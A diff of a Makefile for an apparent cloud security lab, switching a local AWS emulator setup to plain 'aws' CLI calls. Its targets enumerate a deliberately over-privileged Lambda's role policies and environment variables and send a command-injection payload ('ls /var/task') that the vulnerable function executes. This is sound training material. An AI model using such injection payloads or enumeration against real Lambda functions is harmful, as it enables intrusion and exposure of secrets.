@@ -2,11 +2,11 @@
 # Standard targets: up / down / reset / demo / shell
 .PHONY: up down reset demo shell enumerate invoke inject
 
-up:          ## Build containers, start LocalStack, and deploy the vulnerable Lambda
+up:          ## Build containers, start floci, and deploy the vulnerable Lambda
 	docker compose up -d --build
-	@echo "Waiting for LocalStack..."
+	@echo "Waiting for floci..."
 	@docker compose exec lab bash -c '\
-		until curl -sf http://localstack:4566/_localstack/health | grep -q "\"lambda\""; \
+		until curl -sf http://floci:4566/_localstack/health | grep -q "\"lambda\""; \
 		do sleep 2; done'
 	docker compose run --rm lab bash data/setup.sh
 
@@ -22,19 +22,19 @@ shell:       ## Open a shell in the lab container
 enumerate:   ## Run cloudfox to enumerate Lambda permissions
 	docker compose run --rm lab sh -c '\
 		echo "=== Lambda functions ==="; \
-		awslocal lambda list-functions --query "Functions[*].[FunctionName,Role]" --output table; \
+		aws lambda list-functions --query "Functions[*].[FunctionName,Role]" --output table; \
 		echo ""; \
 		echo "=== Role policies ==="; \
-		awslocal iam list-role-policies --role-name notifier-role; \
+		aws iam list-role-policies --role-name notifier-role; \
 		echo ""; \
 		echo "=== Inline policy ==="; \
-		awslocal iam get-role-policy \
+		aws iam get-role-policy \
 			--role-name notifier-role \
 			--policy-name NotifierPolicy | jq .PolicyDocument'
 
 invoke:      ## Invoke the Lambda with a normal payload
 	docker compose run --rm lab sh -c '\
-		awslocal lambda invoke \
+		aws lambda invoke \
 			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","event_type":"payment"}'"'"' \
 			/tmp/response.json && cat /tmp/response.json | jq .'
@@ -42,7 +42,7 @@ invoke:      ## Invoke the Lambda with a normal payload
 inject:      ## Invoke with injection payload — shows command output in response
 	docker compose run --rm lab sh -c '\
 		echo "Sending injection payload..."; \
-		awslocal lambda invoke \
+		aws lambda invoke \
 			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","command":"ls /var/task"}'"'"' \
 			/tmp/inject-response.json && \
@@ -50,31 +50,31 @@ inject:      ## Invoke with injection payload — shows command output in respon
 
 demo:        ## Full worked demo: enumerate → normal invoke → injection
 	@echo "== 1. List Lambda functions =="
-	docker compose run --rm lab awslocal lambda list-functions \
+	docker compose run --rm lab aws lambda list-functions \
 		--query "Functions[*].[FunctionName,Runtime,Role]" \
 		--output table
 	@echo ""
 	@echo "== 2. Inspect over-privileged role =="
 	docker compose run --rm lab sh -c '\
-		awslocal iam get-role-policy \
+		aws iam get-role-policy \
 			--role-name notifier-role \
 			--policy-name NotifierPolicy 2>/dev/null | jq .PolicyDocument.Statement[].Action'
 	@echo ""
 	@echo "== 3. Check environment variables (sensitive data in env) =="
-	docker compose run --rm lab awslocal lambda get-function-configuration \
+	docker compose run --rm lab aws lambda get-function-configuration \
 		--function-name notifier \
 		--query "Environment.Variables" --output json
 	@echo ""
 	@echo "== 4. Normal invocation =="
 	docker compose run --rm lab sh -c '\
-		awslocal lambda invoke \
+		aws lambda invoke \
 			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","event_type":"payment"}'"'"' \
 			/tmp/demo-response.json && jq . /tmp/demo-response.json'
 	@echo ""
 	@echo "== 5. Injection: list function source files =="
 	docker compose run --rm lab sh -c '\
-		awslocal lambda invoke \
+		aws lambda invoke \
 			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","command":"ls /var/task"}'"'"' \
 			/tmp/inject.json && \
